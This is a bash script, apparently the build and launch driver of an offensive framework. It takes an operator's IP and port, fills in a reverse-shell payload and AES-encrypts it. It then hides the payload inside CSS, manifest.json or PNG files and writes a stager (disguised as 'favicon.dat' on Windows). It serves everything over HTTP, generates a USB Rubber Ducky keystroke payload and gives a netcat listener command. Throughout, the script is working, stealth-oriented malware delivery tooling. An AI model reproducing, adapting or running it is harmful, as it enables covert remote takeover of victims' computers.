#!/bin/bash
set -euo pipefail

cat <<'BANNER'
   ____  _           _       _     ____
  |  _ \| |__   ___ | |_ ___| |__ |  _ \  ___  ___ ___  _ __ ___  ___  _ __
  | |_) | '_ \ / _ \| __/ __| '_ \| | | |/ _ \/ __/ _ \| '__/ _ \/ _ \| '_ \
  |  __/| | | | (_) | || (__| | | | |_| |  __/ (_| (_) | | |  __/ (_) | | | |
  |_|   |_| |_|\___/ \__\___|_| |_|____/ \___|\___\___/|_|  \___|\___/|_| |_|
BANNER

log()   { echo -e "\e[1;32m[$(date +%H:%M:%S)] $1\e[0m"; }
error() { echo -e "\e[1;31m[$(date +%H:%M:%S)] $1\e[0m" >&2; }

check_dep() {
  for cmd in "$@"; do
    command -v "$cmd" &>/dev/null || { error "Missing dependency: $cmd"; exit 1; }
  done
}
check_dep python3 lsof nc

trap 'cleanup; log "Interrupted. Exiting."; exit 1' INT

PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$PROJECT_DIR"

CONFIG_FILE="config/settings.json"
OUTPUT_DIR="output"
WEB_DIR="web"
PAYLOADS_DIR="payloads"
STAGERS_DIR="stagers"

mkdir -p "$OUTPUT_DIR" "$WEB_DIR" "$PAYLOADS_DIR" "$STAGERS_DIR/config"

log "Available local IPv4 addresses:"
mapfile -t ip_list < <(hostname -I | tr ' ' '\n' | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$')
for i in "${!ip_list[@]}"; do
  echo "  [$i] ${ip_list[$i]}"
done

while true; do
  read -p "[*] Choose IP [index]: " ip_index
  if [[ "$ip_index" =~ ^[0-9]+$ ]] && (( ip_index >= 0 && ip_index < ${#ip_list[@]} )); then
    IP="${ip_list[$ip_index]}"
    break
  else
    echo "Invalid index."
  fi
done

read -p "[*] Enter PORT for reverse shell (default 8000): " PORT_SHELL
PORT_SHELL="${PORT_SHELL:-8000}"

read -p "[*] Enter PORT for web server (default 8080): " PORT_SERVE
PORT_SERVE="${PORT_SERVE:-8080}"

free_port() {
  local PORT=$1
  local PIDS
  PIDS=$(lsof -i TCP:"$PORT" -sTCP:LISTEN -t 2>/dev/null || true)
  if [[ -n "$PIDS" ]]; then
    log "Port $PORT is in use. Killing PIDs: $PIDS"
    echo "$PIDS" | xargs -r kill -9
    sleep 1
  fi
}

free_port "$PORT_SHELL"
free_port "$PORT_SERVE"

log "Choose target OS:"
select OS in linux windows mac; do [[ -n "$OS" ]]; break; done

PAYLOAD_PATH="$PAYLOADS_DIR/$OS"
[[ -d "$PAYLOAD_PATH" ]] || { error "No payloads for $OS"; exit 1; }

log "Choose payload in $PAYLOAD_PATH:"
mapfile -t PAYLOADS < <(find "$PAYLOAD_PATH" -mindepth 1 -maxdepth 1 -type d -exec basename {} \;)
select PAYLOAD in "${PAYLOADS[@]}"; do [[ -n "$PAYLOAD" ]]; break; done

log "Choose delivery method:"
select DELIVERY in css manifest png; do [[ -n "$DELIVERY" ]]; break; done

case "$OS" in
  linux)
    STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.sh"
    STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.sh"
    FINAL_STAGE1="$OUTPUT_DIR/stage1.sh"
    FINAL_STAGE1_WEB="stage1.sh";;
  windows)
    STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.ps1"
    STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.ps1"
    FINAL_STAGE1="$OUTPUT_DIR/favicon.dat"
    FINAL_STAGE1_WEB="favicon.dat";;
  mac)
    error "Mac not supported." && exit 2;;
esac

[[ -f "$STAGE2_RAW" ]] || { error "Missing raw payload $STAGE2_RAW"; exit 1; }
[[ -f "$STAGER_FILE" ]] || { error "Missing stager template $STAGER_FILE"; exit 1; }

TMP_PAYLOAD="$OUTPUT_DIR/tmp_raw_payload"
cp "$STAGE2_RAW" "$TMP_PAYLOAD"
sed -i "s/REPLACE_IP/$IP/g; s/REPLACE_PORT/$PORT_SHELL/g" "$TMP_PAYLOAD"

log "Encrypting payload..."
ENCODED=$(python3 tools/encrypt_aes.py "$TMP_PAYLOAD") || { error "Encryption failed"; rm -f "$TMP_PAYLOAD"; exit 1; }
echo "$ENCODED" > "$OUTPUT_DIR/encrypted_stage2.txt"
rm -f "$TMP_PAYLOAD"

case "$DELIVERY" in
  css)      python3 tools/embed_in_css.py "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/style.css" ; DELIVERY_FILE="style.css";;
  manifest) python3 tools/embed_in_manifest.py "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/manifest.json" ; DELIVERY_FILE="manifest.json";;
  png)      python3 tools/embed_in_png.py "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/favicon.png" "$WEB_DIR/favicon.png" ; DELIVERY_FILE="favicon.png";;
esac

DELIVERY_URL="http://$IP:$PORT_SERVE/$DELIVERY_FILE"
KEY=$(grep ENCRYPTION_KEY .env | cut -d= -f2 | tr -d '\r\n')
KEY_HEX=$(echo -n "$KEY" | xxd -p | tr -d '\n')
KEY_HEX_ESCAPED=$(echo "$KEY_HEX" | sed -e 's/[\/&]/\\&/g')

STAGER_CONTENT=$(sed \
  -e "s|REPLACE_DELIVERY|$DELIVERY|g" \
  -e "s|REPLACE_URL|$DELIVERY_URL|g" \
  -e "s|REPLACE_KEY|$KEY_HEX_ESCAPED|g" \
  -e "s|REPLACE_AES|$ENCODED|g" \
  -e "s|REPLACE_IP|$IP|g" \
  -e "s|REPLACE_PORT|$PORT_SHELL|g" \
  "$STAGER_FILE")

if echo "$STAGER_CONTENT" | grep -q 'REPLACE_'; then
  error "Unreplaced placeholders detected in stager template. Abort."
  exit 1
fi

echo "$STAGER_CONTENT" > "$FINAL_STAGE1"
cp "$FINAL_STAGE1" "$WEB_DIR/$FINAL_STAGE1_WEB"

log "Generating Ducky payload..."
python3 tools/generate_ducky.py "$IP" "$PORT_SERVE" 1000 "$OUTPUT_DIR/ducky_payload.txt" "$OS"

serve_web() {
  cd "$WEB_DIR"
  log "Serving at http://$IP:$PORT_SERVE"
  python3 -m http.server "$PORT_SERVE" --bind 0.0.0.0 > ../output/http_server.log 2>&1 &
  SERVER_PID=$!
  cd "$PROJECT_DIR"
}

serve_web
sleep 1

log "Payload generation complete."
echo "  Stage 1 URL:     http://$IP:$PORT_SERVE/$FINAL_STAGE1_WEB"
echo "  Delivery file:   http://$IP:$PORT_SERVE/$DELIVERY_FILE"
echo "  Netcat listener: nc -lvnp $PORT_SHELL"

echo "[$(date)] $IP $PORT_SHELL $PORT_SERVE $OS $PAYLOAD $DELIVERY" >> build_history.log

cat > "$CONFIG_FILE" <<EOF
{
  "last_used": {
    "ip": "$IP",
    "port_shell": $PORT_SHELL,
    "port_serve": $PORT_SERVE,
    "os": "$OS",
    "payload": "$PAYLOAD",
    "delivery": "$DELIVERY",
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  },
  "options": {
    "stealth_level": "max",
    "auto_cleanup": true,
    "log_enabled": true,
    "default_encryption": "aes-256-cbc"
  }
}
EOF

cleanup() {
  if [[ -n "${SERVER_PID:-}" ]] && ps -p $SERVER_PID &>/dev/null; then
    log "Stopping HTTP server (PID $SERVER_PID)..."
    kill $SERVER_PID 2>/dev/null || true
  fi
}
trap cleanup EXIT

log "Press Ctrl+C to stop the web server."
while true; do sleep 60; done
